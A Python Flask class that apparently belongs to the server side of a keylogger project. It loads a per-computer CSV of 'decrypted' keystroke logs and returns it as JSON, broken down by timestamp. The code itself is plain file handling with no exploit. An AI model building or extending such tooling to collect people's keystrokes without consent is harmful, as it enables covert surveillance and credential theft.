from flask import jsonify
import pandas as pd
import os
from config import Config

class StrokesByMachine:
    def __init__(self, target_machine: str):
        self.target_machine = target_machine

    def get_data(self):
        '''
          manager method which handles the requests!
        '''
        file_path = self.get_file_path()
        if not self.file_exists(file_path):
            return self.error_response(f"No logs found for {self.target_machine}", 404)

        try:
            return self.read_and_return_data(file_path)
        except Exception as e:
            return self.error_response(str(e), 500)

    def get_file_path(self) -> str:
        '''
          returns the full file path for the machine's log file
        '''
        filename:str = f'computer_{self.target_machine}_logs.csv'
        return os.path.join(Config.KEYSTROKES_DIR, filename)

    def file_exists(self, file_path: str) -> bool:
        #checks if the log file exists :)
        return os.path.isfile(file_path)

    def read_and_return_data(self, file_path: str):
        """Reads the CSV file and returns all data without filtering."""
        df = pd.read_csv(file_path, encoding="utf-8")



        # Converting timestamp to datetime format
        df["timestamp"] = pd.to_datetime(df["timestamp_str"], format="%Y-%m-%d %H:%M", errors="coerce")

        # Breaking it down by time
        df["year"] = df["timestamp"].dt.year
        df["month"] = df["timestamp"].dt.month
        df["day"] = df["timestamp"].dt.day
        df["hour"] = df["timestamp"].dt.hour
        df["minute"] = df["timestamp"].dt.minute
        table_data = df[["year", "month", "day", "hour", "minute", "decrypted_data"]].to_dict(orient="records")

        return self.success_response(table_data)

    def success_response(self, data):
        # return response if success
        response = jsonify(data)
        response.status_code = 200
        return response

    def error_response(self, message:str, status_code: int):
        # return if failed!
        response = jsonify({"error": message})
        response.status_code = status_code
        return response
